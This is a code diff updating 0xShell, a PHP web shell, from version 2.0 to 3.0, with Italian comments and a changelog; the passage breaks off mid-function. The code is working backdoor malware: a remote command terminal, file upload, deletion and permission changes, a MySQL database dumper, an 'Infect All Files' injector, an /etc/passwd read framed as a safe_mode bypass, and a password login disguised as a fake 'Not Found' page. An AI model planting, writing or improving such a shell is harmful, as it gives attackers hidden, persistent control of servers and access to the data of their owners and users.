@@ -1,14 +1,16 @@
 <?php
+session_start();
+set_time_limit(0);
 /* *
  * 
  * 0xShell ~ http://0xproject.hellospace.net/#0xShell
  *
- * Autore: KinG-InFeT [ http://www.kinginfet.net/ ] , Netw0rkSecurity Team [ http://netw0rksecurity.net/ ]
- * Licenza: GPL
- * Versione: v2.0
+ * Autore: KinG-InFeT [ http://www.kinginfet.net/ ]
+ * Licenza: GNU/GPL
+ * Versione: v3.0
  *
  *
- *  Release pubblicata il: 31/09/2010
+ *  Release pubblicata il: 26/08/2011
  *
  *
  * */ 
@@ -17,13 +19,33 @@
   *
   * CHANGELOG_
   *
-  *  0xShell v2.0
+  *	 v3.0
+  *  [+] Utilizzo Semplificato
+  *  [+] Migliorate tutte le funzionalità
+  *  [+] Aggiunta visualizzazione della grandezza file (B, KB, MB, GB)
+  *  [+] Aggiunta funzione per il Download dei file
+  *  [+] Migliorata la funzione CHMOD per i permessi
+  *  [+] Aggiunto Login con password di accesso "nascosta"
+  *  [+] Sistemata la visualizzazione del phpinfo()
+  *  [+] Fixato problema degli spazzi in nomi file e directory!
+  *  [+] Aggiunta funzione per visualizzare le variabili del file php.ini
+  *  [+] Aggiunta funzione di HEXDUMP per qualsiasi file
+  *  [+] Fixato un problema per la visualizzazione dei file
+  *  [+] Fixato errore nella funzione mkdir (non calcolava la directory corrente)
+  *  [+] Fixato errore in rmdir (non calcolava la directory corrente)
+  *  [+] Fixato errore nella funzione di upload di file (non calcolava la directory corrente)
+  *  [+] Fixato problema nel mysql-dump del database (il file scaricato incorporava anche il codice della pagina web)
+  *  [+] Migliorata la funzione del MySQL-Dump
+  *  [+] Fixate 2 falle di tipo XSS
+  *  [+] Revisionato e identato per bene l'intero sorgente
+  *
+  *  v2.0
   *  [+] Rivista l'intera identazione del codice
   *  [+] Aggiunta colorazione della sintassi durante la visualizzazione del codice di una pagina
   *  [+] Sistemato il Footer
   *  [+] Fixed XSS in $patch variable
   *  [+] Aggiunta possibilità di uplodare un qualsiasi file
-  *  [+] Aggiunto il terminale Linux (Thanks C99 Shell)
+  *  [+] Aggiunto il terminale Linux (Thanks C99 Shell ♥)
   *  [+] Aggiunta la possibilità di Chmoddare un file o una directory tramite la funzione chmod()
   *  [+] Fixato il problema nelle informazioni ( se exec non esiste? xd)
   *  [+] Aggiunto il Dumper per i database MySQL
@@ -32,7 +54,7 @@
   *  [+] Aggiunto il Safe_Mode ByPass con lettura del /etc/passwd file :D
   *  [+] Identata e commentata tutta la pagina :D
   *
-  *  0xShell v1.0
+  *  v1.0
   *  [+] Possibilità di navigare tra i vari file e directory
   *  [+] Possibilità di eliminare file
   *  [+] Possibilità di eliminare directory
@@ -46,11 +68,64 @@
   *
   * */
 
-set_time_limit(0);
-error_reporting(E_ALL ^ E_NOTICE);
+//versione
+define("VERSION","3.0");
 
-//versione della Shell :P
-define("VERSION","2.0");
+//            -LOGIN-
+//Settare solo se si vuole attivare il login
+//  1 = attivo
+//  0 = disattivo
+//
+$login = 0;
+//
+//  Password default = root = 63a9f0ea7bb98050796b649e85481845
+$password = "63a9f0ea7bb98050796b649e85481845";
+//---------------------
+
+if($login == 1)
+	$_SESSION['login'] = "activate";
+else
+	$_SESSION['login'] = 1;
+
+if(@$_SESSION['login'] == "activate") {
+
+	if(empty($password))
+		die("[ERROR] Setting Password for Login.");
+		
+	if(@$_GET['send'] == 1)
+		if(md5(@$_POST['pass']) == $password)
+			$_SESSION['login_0xShell'] = $password;
+		else
+			$_SESSION['login_0xShell'] = NULL;
+}
+
+if(@$_SESSION['login'] == "activate")
+	if(@$_SESSION['login_0xShell'] != $password)
+		die('<h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache Server at Port 80</address><style>input { margin:0;background-color:#fff;border:1px solid #fff; }</style><form method="POST" action="?send=1"><input type="password" name="pass"></form>');
+
+//            - END LOGIN-
+
+@$patch       = htmlspecialchars($_SERVER['PHP_SELF']);
+@$dir         = $_GET['dir'];
+@$remove_file = $_GET['remove_file'];
+@$view_file   = $_GET['view_file'];
+@$edit_file   = $_GET['edit_file'];
+@$down_file   = $_GET['download_file'];
+@$hexdump	  = $_GET['hexdump_file'];
+@$rmdir       = $_GET['rmdir'];
+@$action      = $_GET['action'];
+@$cmd         = $_REQUEST['cmd'];
+
+//controllo login attivo
+function check_login($login) {
+
+	if ($login == 0)
+		$active = "<font color='red'>OFF</font>";
+	else
+		$active = "<font color='green'>ON</font>";
+		
+	return $active;
+}
 
 //controlla se il safe_mode è attivo oppure no
 function check_safe_mode() {
@@ -70,11 +145,65 @@ function check_magic_quotes_gpc() {
 	return $magic_quotes;
 }
 
+function view_perms_color($file) {
+	if (!is_readable($file))
+		return "<font color=red>".get_perms($file,1)."</font>";
+	else
+		if (!is_writable($file)) 
+			return "<font color=green>".get_perms($file,1)."</font>";
+	else
+		return "<font color=#4C83AF>".get_perms($file,1)."</font>";
+}
+
+function parse_perms($mode) {
+      if (($mode & 0xC000) === 0xC000)
+		$t = "s";
+      else
+		if (($mode & 0x4000) === 0x4000)
+			$t = "d";
+      else
+		if (($mode & 0xA000) === 0xA000)
+			$t = "l";
+      else
+		if (($mode & 0x8000) === 0x8000)
+			$t = "-";
+      else
+		if (($mode & 0x6000) === 0x6000)
+			$t = "b";
+      else
+		if (($mode & 0x2000) === 0x2000)
+			$t = "c";
+      else
+		if (($mode & 0x1000) === 0x1000)
+			$t = "p";
+      else
+		$t = "?";
+		
+      $o["r"] = ($mode & 00400) > 0; 
+	  $o["w"] = ($mode & 00200) > 0; 
+	  $o["x"] = ($mode & 00100) > 0;
+	  
+      $g["r"] = ($mode & 00040) > 0; 
+	  $g["w"] = ($mode & 00020) > 0; 
+	  $g["x"] = ($mode & 00010) > 0;
+	  
+      $w["r"] = ($mode & 00004) > 0; 
+	  $w["w"] = ($mode & 00002) > 0; 
+	  $w["x"] = ($mode & 00001) > 0;
+	  
+      return array( "t" => $t,
+					"o" => $o,
+					"g" => $g,
+					"w" => $w
+				);
+}
+
 //fa il controllo dei permessi e ne restituisce il valore
 function get_perms($file,$type) {
 	switch($type) {
 		case 1;
-			$mode   = fileperms($file);
+			$mode  = fileperms($file);
+			$perms = NULL;
 			$perms .= ($mode & 00400) ? 'r' : '-';
 			$perms .= ($mode & 00200) ? 'w' : '-';
 			$perms .= ($mode & 00100) ? 'x' : '-';
@@ -96,7 +225,7 @@ return $perms;
 
 //delete a Directory
 function del_dir($dirname) {
-if(is_dir($dirname)){
+	if(is_dir($dirname)){
 		$handle = opendir($dirname);
 		while (FALSE !== ($file = readdir($handle))) { 
 			if(is_file($dirname.$file)){
@@ -130,7 +259,7 @@ function cmd($cmd) {
 			system($cmd); 
 			$result = @ob_get_contents(); 
 			@ob_clean(); 
-			echo $v;
+			print $v;
 		}
 	elseif (is_callable("passthru")) {
 			$v = @ob_get_contents(); 
@@ -138,7 +267,7 @@ function cmd($cmd) {
 			passthru($cmd); 
 			$result = @ob_get_contents(); 
 			@ob_clean(); 
-			echo $v;
+			print $v;
 		}
 	elseif (is_resource($fp = popen($cmd,"r"))) {
 			$result = "";
@@ -153,7 +282,7 @@ function cmd($cmd) {
 
 //dumper per il MySQL
 function _mysqldump($mysql_database) {
-	$sql    = "show tables;";
+	$sql    = "SHOW TABLES;";
 	$result = mysql_query($sql);
 	if( $result)
 	{
@@ -169,28 +298,28 @@ function _mysqldump($mysql_database) {
 	}
 	else
 	{
-		echo "/* no tables in $mysql_database */\n";
+		print "/* no tables in $mysql_database */\n";
 	}
 	mysql_free_result($result);
 }
 
 function _mysqldump_table_structure($table)
 {
-	echo "/* Table structure for table `$table` */\n";
+	print "/* Table structure for table `$table` */\n";
 	if( isset($_REQUEST['sql_drop_table']))
 	{
-		echo "DROP TABLE IF EXISTS `$table`;\n\n";
+		print "DROP TABLE IF EXISTS `$table`;\n\n";
 	}
 	if( isset($_REQUEST['sql_create_table']))
 	{
 
-		$sql    = "show create table `$table`; ";
+		$sql    = "SHOW CREATE TABLE `$table`; ";
 		$result = mysql_query($sql);
 		if( $result)
 		{
 			if($row= mysql_fetch_assoc($result))
 		{
-				echo $row['Create Table'].";\n\n";
+				print $row['Create Table'].";\n\n";
 				}
 		}
 		mysql_free_result($result);
@@ -199,7 +328,7 @@ function _mysqldump_table_structure($table)
 
 function _mysqldump_table_data($table) {
 
-	$sql    = "select * from `$table`;";
+	$sql    = "SELECT * FROM `$table`;";
 	$result = mysql_query($sql);
 	if( $result)
 	{
@@ -208,7 +337,7 @@ function _mysqldump_table_data($table) {
 
 		if( $num_rows > 0)
 		{
-			echo "/* dumping data for table `$table` */\n";
+			print "/* dumping data for table `$table` */\n";
 
 			$field_type=array();
 			$i=0;
@@ -219,47 +348,47 @@ function _mysqldump_table_data($table) {
 				$i++;
 			}
 
-			echo "insert into `$table` values\n";
+			print "INSERT INTO `$table` VALUES\n";
 			$index = 0;
 			while( $row = mysql_fetch_row($result))
 			{
-				echo "(";
+				print "(";
 				for( $i=0; $i < $num_fields; $i++)
 				{
 					if( is_null( $row[$i]))
-						echo "null";
+						print "null";
 					else
 					{
 						switch( $field_type[$i])
 						{
 							case 'int':
-								echo $row[$i];
+								print $row[$i];
 							break;
 							case 'string':
 							case 'blob' :
 							default:
-								echo "'".mysql_real_escape_string($row[$i])."'";
+								print "'".mysql_real_escape_string($row[$i])."'";
 						}
 					}
 					if( $i < $num_fields-1)
-						echo ",";
+						print ",";
 				}
-				echo ")";
+				print ")";
 						if( $index < $num_rows-1)
-					echo ",";
+					print ",";
 				else
-					echo ";";
-				echo "\n";
+					print ";";
+				print "\n";
 
 				$index++;
 			}
 		}
 	}
 	mysql_free_result($result);
-	echo "\n";
+	print "\n";
 }
 
-//test per la connessione al MySQL
+//Test per la connessione al MySQL
 function _mysql_test($mysql_host,$mysql_database, $mysql_username, $mysql_password) {
 	global $output_messages;
 	
@@ -267,13 +396,13 @@ function _mysql_test($mysql_host,$mysql_database, $mysql_username, $mysql_passwo
 	if (!$link) {
 	   array_push($output_messages, 'Could not connect: ' . mysql_error());
 	}else{
-		array_push ($output_messages,"Connected with MySQL server:$mysql_username@$mysql_host successfully");
+		array_push ($output_messages,"Connected with MySQL server: <b>".$mysql_username."@".$mysql_host."</b> <font color=\"green\">Successfully</font>");
 		
 		$db_selected = mysql_select_db($mysql_database, $link);
 		if (!$db_selected)
-			array_push ($output_messages,'Can\'t use $mysql_database : ' . mysql_error());
+			array_push ($output_messages,'Can\'t use <b>'.$mysql_database.'</b> : ' . mysql_error());
 		else
-			array_push ($output_messages,"Connected with MySQL database:$mysql_database successfully");
+			array_push ($output_messages,"Connected with MySQL database: <b>".$mysql_database."</b> <font color=\"green\">Successfully</font>");
 	}
 
 }
@@ -288,13 +417,14 @@ function infect_all_files($code_infect) {
 		@fclose($open);
 	}
 	if($open)
-		$text = '<font size=1 face=Verdana color=lightgreen>Infected!</font>';
+		$text = '<font size=3 face=Verdana color=lightgreen>Infected!</font>';
 	else
 		$text = '<font size=1 face=Verdana color=red>Error (Bad Perms?)</font>';
+		
 	return $text;
 }
 
-//funcione per il safe_mode_bypass (lettura del /etc/passwd file :P
+//funzione per il safe_mode_bypass (lettura del /etc/passwd file :P
 function safe_mode_bypass($file) {
 	$test  = '';
 	$tempp = tempnam($test, "cx");
@@ -304,45 +434,34 @@ function safe_mode_bypass($file) {
 		$freadz  = fread($fopenzo, filesize($tempp));
 		fclose($fopenzo);
 		$source = htmlspecialchars($freadz);
-		echo "<center><font size='1' face='Verdana'>".$get."</font><br><textarea rows='20' cols='80' name='source'>".$source."</textarea></center>";
+		print "<center><font size='1' face='Verdana'>".$get."</font><br><textarea rows='20' cols='80' name='source'>".$source."</textarea></center>";
 		unlink($tempp);
 	} else {
-		echo "<center><font size='1' color='red' face='Verdana'>Error</font></center>";
+		print "<center><font size='1' color='red' face='Verdana'>Error</font></center>";
 	}
 }
 
 //funzione per il settaggio dei permessi (CHMOD)
 function chmod_shell($file, $perms) {
-	@$var = fopen($file,'w') or die("Error! Impossibile aprire il File");
 	
-	$check = @chmod($file, $perms);
+	$check = chmod($file, $perms);
 	
 	if($check == TRUE)
-		$control = "<center><font size='1' color='green' face='Verdana'>chmodded!</font></center>";
+		$control = "<center><font size='4' color='green' face='Verdana'>CHMOD [OK]</font></center>";
 	else
-		$control = "<center><font size='1' color='red' face='Verdana'>ERROR</font></center>";
-		
-	@fclose($var); 
+		$control = "<center><font size='4' color='red' face='Verdana'>CHMOD [ERROR]</font></center>";
 	
 	return $control;
-}	
+}
 
 $print_form      = 1;
 $output_messages = array();
 
-$patch       = htmlspecialchars($_SERVER['PHP_SELF']);
-$dir         = $_GET['dir'];
-$remove_file = $_GET['remove_file'];
-$view_file   = $_GET['view_file'];
-$edit_file   = $_GET['edit_file'];
-$rmdir       = $_GET['rmdir'];
-$action      = $_GET['action'];
-$cmd         = $_REQUEST['cmd'];
-
 ?>
 <html>
 <head>
-<title>0xShell v <?php echo VERSION; ?></title>
+<title>0xShell v <?php print VERSION; ?></title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <style type="text/css">
 table {
 	background-color: #000000;
@@ -371,13 +490,12 @@ a:link,a:visited,a:active {
 	font-size: 10px;
 	text-decoration: none;
 	color: #FFFFFF;
-	cursor: default;
 }
 
 pre {
 	background-color: #666666;
 	text-align: left;
-	padding: 10px;
+	padding: 3px;
 }
 
 a:hover{
@@ -386,32 +504,33 @@ a:hover{
 </style>
 </head>
 <body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
-<h2 align="center"><code><a href="<?php echo $patch; ?>"><font size="4">[~]</font></a> 0xShell v <?php echo VERSION; ?><blink>_</blink></code></h2>      
+<h2 align="center"><code><a href="<?php print $patch; ?>"><font size="4">[~]</font></a> 0xShell v <?php print VERSION; ?><blink>_</blink></code></h2>      
 
 </div><br />
 <table>
-<tr><td>[~] Uname -a: <u><?php echo php_uname("a"); ?></u></td></tr>
-<tr><td>[~] Kernel Version: <u><?php echo php_uname("r"); ?></u></td></tr>
-<tr><td>[~] Server Address: <u> <?php echo $_SERVER['SERVER_ADDR']; ?></u></td></tr>
-<tr><td>[~] Whois Server: <?php echo "<a href='http://whois.domaintools.com/".$_SERVER['SERVER_ADDR']."'>Click Here</a>"; ?></td></tr>
-<tr><td>[~] Server Name: <u><?php echo $_SERVER['SERVER_NAME']; ?></u></td></tr>
-<tr><td>[~] Server Software: <u><?php echo $_SERVER['SERVER_SOFTWARE']; ?></u></td></tr>
-<tr><td>[~] Charset: <u> <?php echo $_SERVER['HTTP_ACCEPT_CHARSET']; ?></u></td></tr>
-<tr><td>[~] IP Address: <u><?php echo $_SERVER['REMOTE_ADDR']; ?></u></td></tr>
-<tr><td>[~] User Agent: <u><?php echo htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?></u></td></tr>
-<tr><td>[~] Patch: <u><?php echo $_SERVER['DOCUMENT_ROOT']; ?></u></td></tr>
-<tr><td>[~] Safe Mode: <?php echo check_safe_mode(); ?></td></tr>
-<tr><td>[~] Magic Quotes GPC: <?php echo check_magic_quotes_gpc(); ?></td></tr>
+<tr><td>[~] Uname -a: <u>       <?php print php_uname("a"); ?></u></td></tr>
+<tr><td>[~] Kernel Version: <u> <?php print php_uname("r"); ?></u></td></tr>
+<tr><td>[~] Server Address: <u> <?php print $_SERVER['SERVER_ADDR']; ?></u></td></tr>
+<tr><td>[~] Whois Server:       <?php print "<a href='http://whois.domaintools.com/".$_SERVER['SERVER_ADDR']."'>Click Here</a>"; ?></td></tr>
+<tr><td>[~] Server Name: <u>    <?php print $_SERVER['SERVER_NAME']; ?></u></td></tr>
+<tr><td>[~] Server Software: <u><?php print $_SERVER['SERVER_SOFTWARE']; ?></u></td></tr>
+<tr><td>[~] Charset: <u>        <?php print $_SERVER['HTTP_ACCEPT_CHARSET']; ?></u></td></tr>
+<tr><td>[~] IP Address: <u>     <?php print $_SERVER['REMOTE_ADDR']; ?></u></td></tr>
+<tr><td>[~] User Agent: <u>     <?php print htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?></u></td></tr>
+<tr><td>[~] Patch: <u>          <?php print $_SERVER['DOCUMENT_ROOT']; ?></u></td></tr>
+<tr><td>[~] Safe Mode:          <?php print check_safe_mode(); ?></td></tr>
+<tr><td>[~] Magic Quotes GPC:   <?php print check_magic_quotes_gpc(); ?></td></tr>
+<tr><td>[~] Login Access:       <?php print check_login($login); ?> - Password: <?php print $password; ?></td></tr>
 </table>
 <p></p>
 <div align="center">
 <!-- menu -->
 -
 <a href="?" >[File Manager]</a> - 
-<a href="?action=phpinfo" >[PHP-Info]</a> - 
-<a href="?action=mkdir" >[Crea Directory]</a> - 
-<a href="?action=chmod" >[CHMOD]</a> - 
-<a href="?action=upload" >[Upload]</a> - 
+<a href="?action=phpinfo" target="_blank">[PHP-Info]</a> - 
+<a href="?action=phpini" >[PHP.ini]</a> - 
+<a href="?action=mkdir<?php print (empty($_GET['dir'])) ? "" : "&dir=".$_GET['dir']; ?>" >[Crea Directory]</a> - 
+<a href="?action=upload<?php print (empty($_GET['dir'])) ? "" : "&dir=".$_GET['dir']; ?>" >[Upload]</a> - 
 <a href="?action=terminal" >[Terminal]</a> - 
 <a href="?action=mysql_dump" >[MySQL Dumper]</a> - 
 <a href="?action=infect_all_file" >[Infect All Files]</a> - 
@@ -421,19 +540,25 @@ a:hover{
 <div align="center">
 <?php
 switch($action) {//varie azioni
-	case 'phpinfo'; //visualizzo in phpinfo()
-		die(phpinfo());
+	case 'phpinfo'; //visualizzo il phpinfo()
+		@ob_clean();
+		phpinfo();
+		exit;
+	break;
+	
+	case 'phpini':
+		get_phpini();
 	break;
 	
 	case 'mkdir';//crea una directory
-		echo "<form method=\"POST\" action=\"".$patch."?action=mkdir&work=ok\" />\n";
-		echo "Directory Name: <input type='test' name='dir_name' /><br />\n";
-		echo "<input type='submit' value='Create' /></form>";
+		print "<form method=\"POST\" action=\"".$patch."?action=mkdir".(empty($_GET['dir'])) ? "" : "&dir=".$_GET['dir']."&work=ok\" />\n";
+		print "Directory Name: <input type='test' name='dir_name' /><br />\n";
+		print "<input type='submit' value='Create' /></form>";
 		if(@$_GET['work'] == 'ok') {
-			if(mkdir($_POST['dir_name']))
-				echo "<script>alert('Directory Created'); window.location=\"".$patch."\";</script>";
+			if(mkdir($_GET['dir']."/".$_POST['dir_name']))
+				print "<script>alert('Directory Created'); window.location=\"".$patch."?dir=".$_GET['dir']."\";</script>";
 			else
-				echo "<script>alert('Directory Not Created'); window.location=\"".$patch."\";</script>";
+				print "<script>alert('Directory Not Created'); window.location=\"".$patch."?dir=".$_GET['dir']."\";</script>";
 		}
 	break;
 	
@@ -442,31 +567,38 @@ switch($action) {//varie azioni
 		. "Command: <input type=\"text\" name=\"cmd\" />"
 		. "<input type=\"submit\" name=\"submit\" value=\"Send\" />";
 		
-		if($_POST['submit']) {
+		if(@$_POST['submit']) {
 			$ret  = cmd($cmd);
 			$ret  = convert_cyr_string($ret,"d","w");
 			$rows = count(explode("\r\n",$ret)) + 1;
 			if ($rows < 10)
 				$rows = 20;
-			echo "<br /><br /><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
+			print "<br /><br /><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
 		}
 	break;
 	
 	case 'upload':
-		print "\n<form method=\"POST\" action=\"".$patch."?action=upload\" enctype=\"multipart/form-data\">\n"
-		    . "<input type=\"file\" name=\"miofile\"><br /><br />\n"
+		if(empty($_GET['dir']))
+			print "\n<form method=\"POST\" action=\"".$patch."?action=upload\" enctype=\"multipart/form-data\">\n";
+		else
+			print "\n<form method=\"POST\" action=\"".$patch."?action=upload&dir=".$_GET['dir']."\" enctype=\"multipart/form-data\">\n";
+			
+		print "<input type=\"file\" name=\"miofile\"><br /><br />\n"
 		    . "<input type=\"submit\" name=\"send_upload\" value=\"Upload\">\n"
 		    . "</form>\n";
 		    
-		 if(@$_POST['send_upload']) {
+		if(@$_POST['send_upload']) {
+			if(empty($_GET['dir']))
+				$percorso = $_FILES['miofile']['tmp_name'];
+			else
+				$percorso = $_GET['dir']."/".$_FILES['miofile']['tmp_name'];
 		 
-		    $percorso = $_FILES['miofile']['tmp_name'];
 		    $nome     = $_FILES['miofile']['name'];
 		    
-		    if (move_uploaded_file($percorso, $dir . $nome))
-		        print "Upload eseguito con successo";
+		    if (move_uploaded_file($percorso, $nome))
+		        print "<font color=\"green\">Upload eseguito con successo</font>";
 		    else
-		        print "Errore! Upload del file non eseguito correttamente riprovare...";
+		        print "<font color=\"red\">[ERROR] Upload del file non eseguito correttamente. Not Perms?</font>";
 		}
 	break;
 	
@@ -474,10 +606,10 @@ switch($action) {//varie azioni
 	
 		if( isset($_REQUEST['action']) )
 		{
-			$mysql_host     = $_REQUEST['mysql_host'];
-			$mysql_database = $_REQUEST['mysql_database'];
-			$mysql_username = $_REQUEST['mysql_username'];
-			$mysql_password = $_REQUEST['mysql_password'];
+			$mysql_host     = @$_REQUEST['mysql_host'];
+			$mysql_database = @$_REQUEST['mysql_database'];
+			$mysql_username = @$_REQUEST['mysql_username'];
+			$mysql_password = @$_REQUEST['mysql_password'];
 		
 			if( 'Test Connection' == $_REQUEST['action'])
 			{
@@ -489,11 +621,12 @@ switch($action) {//varie azioni
 				if( 'SQL' == $_REQUEST['output_format'] )
 				{
 					$print_form = 0;
-		
+					@ob_clean();
 					header('Content-type: text/plain');
 					header('Content-Disposition: attachment; filename="'.$mysql_host."_".$mysql_database.'_.sql"');
-					echo "/*MySQL-Dumper 0xShell*/\n";
+					print "/*MySQL-Dumper 0xShell*/\n";
 					_mysqldump($mysql_database);
+					exit;
 				}
 			}
 		
@@ -507,34 +640,34 @@ switch($action) {//varie azioni
 		<?php
 			foreach ($output_messages as $message)
 			{
-		    	echo $message."<br />";
+		    	print $message."<br />";
 			}
 		?>
-		<form action="<?php echo $patch."?action=mysql_dump"; ?>" method="POST">
+		<form action="<?php print $patch."?action=mysql_dump"; ?>" method="POST">
 		MySQL connection parameters:
 		<table border="0">
 		  <tr>
 		    <td>Host:</td>
-		    <td><input  name="mysql_host" value="<?php if(isset($_REQUEST['mysql_host'])) echo $_REQUEST['mysql_host']; else echo 'localhost';?>"  /></td>
+		    <td><input  name="mysql_host" value="<?php if(isset($_REQUEST['mysql_host'])) print $_REQUEST['mysql_host']; else print 'localhost';?>"  /></td>
 		  </tr>
 		  <tr>
 		    <td>Database:</td>
-		    <td><input  name="mysql_database" value="<?php echo @$_REQUEST['mysql_database']; ?>"  /></td>
+		    <td><input  name="mysql_database" value="<?php print @$_REQUEST['mysql_database']; ?>"  /></td>
 		  </tr>
 		  <tr>
 		    <td>Username:</td>
-		    <td><input  name="mysql_username" value="<?php echo @$_REQUEST['mysql_username']; ?>"  /></td>
+		    <td><input  name="mysql_username" value="<?php print @$_REQUEST['mysql_username']; ?>"  /></td>
 		  </tr>
 			  <tr>
 		    <td>Password:</td>
-		    <td><input  type="password" name="mysql_password" value="<?php echo @$_REQUEST['mysql_password']; ?>"  /></td>
+		    <td><input  type="password" name="mysql_password" value="<?php print @$_REQUEST['mysql_password']; ?>"  /></td>
 		  </tr>
 		  <tr>
 	    <td>Output format: </td>
 		    <td>
 		      <select name="output_format" >
-		        <option value="SQL" <?php if( isset($_REQUEST['output_format']) && 'SQL' == $_REQUEST['output_format']) echo "selected";?> >SQL</option>
-		        <option value="CSV" <?php if( isset($_REQUEST['output_format']) && 'CSV' == $_REQUEST['output_format']) echo "selected";?> >CSV</option>
+		        <option value="SQL" <?php if( isset($_REQUEST['output_format']) && 'SQL' == $_REQUEST['output_format']) print "selected";?> >SQL</option>
+		        <option value="CSV" <?php if( isset($_REQUEST['output_format']) && 'CSV' == $_REQUEST['output_format']) print "selected";?> >CSV</option>
 		        </select>
 		    </td>
 		  </tr>
@@ -544,15 +677,15 @@ switch($action) {//varie azioni
 		  <table border="0">
 		    <tr>
 		      <td>Drop table statement: </td>
-		      <td><input type="checkbox" name="sql_drop_table" <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_drop_table'])) ; else echo 'checked' ?> /></td>
+		      <td><input type="checkbox" name="sql_drop_table" <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_drop_table'])) ; else print 'checked' ?> /></td>
 			    </tr>
 		    <tr>
 		      <td>Create table statement: </td>
-		      <td><input type="checkbox" name="sql_create_table" <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_create_table'])) ; else echo 'checked' ?> /></td>
+		      <td><input type="checkbox" name="sql_create_table" <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_create_table'])) ; else print 'checked' ?> /></td>
 		    </tr>
 		    <tr>
 		      <td>Table data: </td>
-		      <td><input type="checkbox" name="sql_table_data"  <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_table_data'])) ; else echo 'checked' ?>/></td>
+		      <td><input type="checkbox" name="sql_table_data"  <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_table_data'])) ; else print 'checked' ?>/></td>
 		    </tr>
 		  </table>
 		<input type="submit" name="action"  value="Export"><br />
@@ -562,7 +695,7 @@ switch($action) {//varie azioni
 		break;
 		
 		case 'infect_all_file':
-			if($_GET['inject']) {
+			if(@$_GET['inject'] && !empty($_POST['code_inject'])) {
 				infect_all_files($_POST['code_infect']);
 			}else{
 				print "<form method='post' action='".$patch."?action=infect_all_file'>\n"
@@ -579,18 +712,53 @@ switch($action) {//varie azioni
 				. "<input type='submit' value='Read File' name='red_file'>\n"
 				. "</form>\n";
 			if(isSet($_POST['red_file'])) {
-				safe_mode_bypass($_POST['filew']);
+				if(empty($_POST['filew']))
+					die("[ERROR] Enter the name file.");
+				else
+					safe_mode_bypass($_POST['filew']);
 			}
 		break;
 		
 		case 'chmod':
-			print "<form action='".$patch."?action=chmod' method='POST'>\n"
-				. "File: <input type=\"text\" name=\"file\" value=\"".htmlspecialchars($_GET['file'])."\" /><br />\n"
-			    . "Perms Value: <input type='text' name='perms' value='".$_GET['perms']."'><br />\n"
-			    . "<input type='submit' value='Edit CHMOD' name='chmod_edit'>\n"
-				. "</form>\n";
+				
+				$perms = parse_perms(fileperms($_GET['file']));
+				
+				print "<form action=\"".$patch."?action=chmod&file=".htmlspecialchars($_GET['file'])."\" method=\"POST\">
+				<h3 align=\"center\">Chmod File: <i>".htmlspecialchars($_GET['file'])." - (".view_perms_color($_GET['file']).")</i></h3><br />
+				<table align=center width=300 border=0 cellspacing=0 cellpadding=5>
+				<tr><td><b>Owner</b><br><br>
+				    <input type=checkbox NAME='chmod_o_r' value=1".($perms["o"]["r"] ? " checked" : "").">Read
+				<br><input type=checkbox name='chmod_o_w' value=1".($perms["o"]["w"] ? " checked" : "").">Write
+				<br><input type=checkbox NAME='chmod_o_x' value=1".($perms["o"]["x"] ? " checked" : "").">eXecute</td>
+				<td><b>Group</b><br><br>				
+				    <input type=checkbox NAME='chmod_g_r' value=1".($perms["g"]["r"] ? " checked" : "").">Read
+				<br><input type=checkbox NAME='chmod_g_w' value=1".($perms["g"]["w"] ? " checked" : "").">Write
+				<br><input type=checkbox NAME='chmod_g_x' value=1".($perms["g"]["x"] ? " checked" : "").">eXecute
+				</font></td>				
+				<td><b>World</b><br><br>
+				    <input type=checkbox NAME='chmod_w_r' value=1".($perms["w"]["r"] ? " checked" : "").">Read
+				<br><input type=checkbox NAME='chmod_w_w' value=1".($perms["w"]["w"] ? " checked" : "").">Write
+				<br><input type=checkbox NAME='chmod_w_x' value=1".($perms["w"]["x"] ? " checked" : "").">eXecute
+				</font></td></tr><tr><td>
+				<input type='submit' name='chmod_edit' value='Save'>
+				</td></tr>
+				</table>
+				</form>";
+				
 			if(isSet($_POST['chmod_edit'])) {
-				print chmod_shell($_POST['file'], $_POST['perms']);
+				$perms_final = "0".base_convert((@$_POST['chmod_o_r'] ? 1 : 0).
+												(@$_POST['chmod_o_w'] ? 1 : 0).
+												(@$_POST['chmod_o_x'] ? 1 : 0).
+												
+												(@$_POST['chmod_g_r'] ? 1 : 0).
+												(@$_POST['chmod_g_w'] ? 1 : 0).
+												(@$_POST['chmod_g_x'] ? 1 : 0).
+												
+												(@$_POST['chmod_w_r'] ? 1 : 0).
+												(@$_POST['chmod_w_w'] ? 1 : 0).
+												(@$_POST['chmod_w_x'] ? 1 : 0), 2, 8);
+										
+				print chmod_shell($_GET['file'], $perms_final);
 			}
 		break;
 				
@@ -602,18 +770,33 @@ if(isset($remove_file)) {  //Rimozione file
 		die("File Not Deleted");
 		
 	if(unlink($remove_file))
-		echo "<script>alert('File Deleted'); location.href='$patch';</script>";
+		print "<script>alert('File Deleted'); location.href='".$patch."';</script>";
 	else
-		echo "<script>alert('File Not Deleted'); location.href='$patch';</script>";
+		print "<script>alert('File Not Deleted'); location.href='".$patch."';</script>";
+}
+
+function check_extenction($file) {
+
+	if(preg_match("/\.php$/i", $file) == TRUE)
+		return "php";
+	else
+		return "unknown";
+
 }
 
 if(isset($view_file)) {  //view file
 	if(!(is_readable($view_file))) {
 		die("File Not View");
 	}else{
-		echo "<b>View File: ".$view_file."</b><br />\n";
-		echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: #c0c0c0; text-align: left;\">\n";
-		echo highlight_file($view_file)."\n</div>\n";
+		print "View File: <b>".$view_file."</b><br />\n";
+		print "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: #c0c0c0; text-align: left;\">\n";
+		
